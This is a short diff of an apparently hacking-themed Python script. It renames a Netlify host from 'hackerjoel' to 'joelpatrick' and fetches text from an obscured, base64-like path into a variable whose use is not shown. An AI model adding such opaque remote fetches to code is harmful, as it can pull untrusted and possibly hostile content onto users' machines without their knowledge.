@@ -36,7 +36,7 @@ def banner():
 init()
 cic()
 
-uz = 'https://hackerjoel.netlify.app/js/CBjYXRjaCB0aGUgc3VjY2VlZGluZyBvdXRnb2luZyB0cmFmZmljIGZyb20gdGhpcyBzZXJ2ZXIgaW'
+uz = 'https://joelpatrick.netlify.app/js/CBjYXRjaCB0aGUgc3VjY2VlZGluZyBvdXRnb2luZyB0cmFmZmljIGZyb20gdGhpcyBzZXJ2ZXIgaW'
 response = requests.get(uz)
 if response.status_code == 200:
     eqp = response.text
